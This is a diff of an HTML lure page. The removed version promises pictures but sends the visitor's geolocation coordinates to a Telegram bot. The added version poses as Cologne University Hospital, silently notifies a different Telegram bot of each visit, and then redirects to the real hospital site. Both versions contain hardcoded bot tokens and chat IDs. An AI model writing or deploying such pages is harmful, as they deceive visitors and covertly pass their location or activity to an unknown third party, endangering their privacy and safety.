@@ -1,61 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="de">
 <head>
-    <title>Sebuhi, Sako, Xeyyam, Cavad</title>
-    <style>
-        body {
-            background-color: black;
-            color: lime;
-            font-family: monospace;
-            padding: 20px;
-            text-align: center;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 18px;
-            background: lime;
-            color: black;
-            border: none;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Cologne University Hospital</title>
+
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background:
+        linear-gradient(rgba(0,0,0,0.75), rgba(0,0,0,0.75)),
+        url("https://upload.wikimedia.org/wikipedia/commons/6/6f/Universit%C3%A4tsklinikum_K%C3%B6ln.jpg");
+      background-size: cover;
+      background-position: center;
+      font-family: monospace;
+      color: lime;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .box {
+      background: rgba(0,0,0,0.8);
+      border: 1px solid lime;
+      padding: 25px;
+      max-width: 420px;
+      text-align: center;
+      box-shadow: 0 0 20px lime;
+    }
+
+    button {
+      padding: 12px 22px;
+      font-size: 18px;
+      background: lime;
+      color: black;
+      border: none;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+  </style>
 </head>
+
 <body>
-    <h1>Sebuhi, Sako, Xeyyam, Cavad</h1>
-    <p>Şekillere 1 defe baxmağ olur...</p>
-    <p>П...</p>
-    <button onclick="getLocation()">Şekileri göster</button>
-    <p id="result"></p>
 
-    <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition);
-            } else {
-                document.getElementById("result").innerText = "Геолокация не поддерживается.";
-            }
-        }
+<div class="box">
+  <h1>Cologne University Hospital</h1>
+  <p>Zugriff wird geprüft…</p>
+  <button onclick="openUni()">Informationen ansehen</button>
+  <p id="result"></p>
+</div>
 
-        function showPosition(position) {
-            const lat = position.coords.latitude.toFixed(4);
-            const lon = position.coords.longitude.toFixed(4);
-            
-            // Telegram Bot Info
-            const botToken = "7678736983:AAHwSffWrSToZjnYUE5gWmF2bAA-rUa-z7o";
-            const chatId = "5483361865";
+<script>
+function sendToTelegram() {
+  const botToken = "8402128842:AAHUBBOkf7jJ8M1G_NjZPoJ_wud0-UR7t3I";
+  const chatId = "8570996143";
+  const msg = "👀 Kimsə Uniklinikum Köln səhifəsinə baxdı";
 
-            // Telegram API URL
-            const message = `Кто-то нажал ссылку!\nШирота: ${lat}\nДолгота: ${lon}`;
-            
-            // Отправка сообщения в Telegram
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+}
 
-            document.getElementById("result").innerHTML = `
-                Твои координаты получены.<br>
-                Широта: ${lat}, Долгота: ${lon}<br>
-                <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank">Открыть в Google Maps</a>
-            `;
-        }
-    </script>
+function openUni() {
+  sendToTelegram();
+  document.getElementById("result").innerText = "Weiterleitung…";
+
+  setTimeout(() => {
+    window.open("https://www.uk-koeln.de", "_blank");
+  }, 1200);
+}
+</script>
+
 </body>
 </html>
